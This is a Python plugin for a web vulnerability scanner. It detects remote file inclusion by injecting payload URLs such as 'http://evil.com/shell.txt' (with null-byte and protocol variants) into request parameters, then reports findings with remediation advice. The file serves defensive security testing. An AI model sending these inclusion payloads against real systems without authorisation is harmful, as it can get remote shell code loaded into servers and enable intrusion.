"""Remote File Inclusion (RFI) audit plugin."""

from __future__ import annotations

import asyncio
from typing import Any

import structlog

from xfweb.core.plugins.plugin_base import AuditPlugin
from xfweb.core.net.http_engine import HttpEngine

logger = structlog.get_logger()

RFI_PAYLOADS = [
    "http://evil.com/shell.txt",
    "http://evil.com/shell.txt?",
    "http://evil.com/shell.txt%00",
    "https://evil.com/shell.txt",
    "ftp://evil.com/shell.txt",
]


class RfiPlugin(AuditPlugin):
    """Remote File Inclusion vulnerability detector."""

    plugin_name = "rfi"
    brief_description = "Detect remote file inclusion (RFI) vulnerabilities"

    async def audit(self, freq: Any, http: HttpEngine) -> None:
        params = self._extract_params(freq)
        if not params:
            return
        tasks = [self._test_param(freq, p, v, http) for p, v in params.items()]
        await asyncio.gather(*tasks, return_exceptions=True)

    def _extract_params(self, freq: Any) -> dict[str, str]:
        params: dict[str, str] = {}
        if freq.post_data and isinstance(freq.post_data, str):
            for pair in freq.post_data.split("&"):
                if "=" in pair:
                    k, v = pair.split("=", 1)
                    params[k] = v
        if freq.url.query:
            for pair in freq.url.query.split("&"):
                if "=" in pair:
                    k, v = pair.split("=", 1)
                    params[k] = v
        return params

    async def _test_param(self, freq: Any, param: str, value: str, http: HttpEngine) -> None:
        for payload in RFI_PAYLOADS:
            modified_url = freq.url.raw_url.replace(
                f"{param}={value}", f"{param}={payload}",
            )
            resp = await http.get(modified_url)
            if resp.status_code == 200 and "shell" in resp.text.lower():
                self.report_finding(
                    name=f"Remote File Inclusion via '{param}'",
                    severity="high",
                    url=freq.url.raw_url,
                    description=f"RFI vulnerability in parameter '{param}'. "
                    "The application fetches and includes remote files.",
                    parameter=param,
                    evidence=f"Payload: {payload}\nRemote file content found in response",
                    http_request={"method": freq.method, "url": modified_url},
                    http_response={"status": resp.status_code, "body_excerpt": resp.text[:500]},
                    remediation="Do not include remote files based on user input. "
                    "Use a whitelist of allowed URLs. Disable remote file inclusion (allow_url_include=Off).",
                )
                return
